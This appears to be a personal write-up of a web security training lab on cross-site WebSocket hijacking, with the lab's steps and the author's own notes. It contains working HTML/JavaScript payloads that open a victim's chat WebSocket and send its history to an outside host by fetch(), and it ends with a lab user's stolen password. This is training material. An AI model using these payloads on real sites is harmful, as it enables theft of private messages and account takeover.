his online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

#### Note

>To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---

**Goal:** Exploit the live chat feature that is using WebSockets. Use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

**Analysis:** The live chat remembers the conversation, which means it must be setting a session cookie, and the same site is set to `none`, so the session cookie will be sent in a cross site request. 

Vulnerabilities:
1. Session cookie: `SameSite=None`
2. /chat endpoint is vulnerable to CSRF
3. WebSocket replies with entire chat history on **READY** Message

![[Pasted image 20240830081004.png]]

**Solution (Burp Pro):** 

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:

```js
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
  
7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by Burp Collaborator.
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.

---

I Can modify the script so that it will send the messages back to the exploit server instead of burp pro's collaborator.

```js
<script>
    var ws = new WebSocket('wss://0a7100a603187082802d5d4b000e004a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0a2e004003eb700180b15c51013000c6.exploit-server.net/exploit?comment=' + event.data);
    }
</script>
```

- I'll store the script first to save it, and then use the deliver button to send it to the fake user which mimics an email phishing attack.
- This should return the b64 encoded log message of the live chat. Note all of them down for decoding. 

![[Pasted image 20240830084156.png]]

I can use the built in decoder in burpsuite to read the live chat which gives me the password for Carlos's account:

![[Pasted image 20240830084055.png]]

**Carlos:** no2stcj0juf4axjayy45

---

**Completed:** _08:44 2024-08-30_

